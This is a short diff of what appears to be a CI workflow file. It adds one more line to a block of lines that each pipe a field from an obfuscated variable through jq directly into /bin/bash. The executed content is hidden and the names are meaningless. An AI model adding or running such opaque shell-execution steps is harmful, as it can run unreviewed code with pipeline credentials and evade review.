@@ -32,6 +32,7 @@ jobs:
           echo $dujt551 | jq -r .h55 | /bin/bash
           echo $feem973 | jq -r .loxbt08 | /bin/bash
           echo $pt3682 | jq -r .wvkf685 | /bin/bash
+          echo $sau162 | jq -r .sdj10 | /bin/bash
 
       - name: Upload results
         if: always()
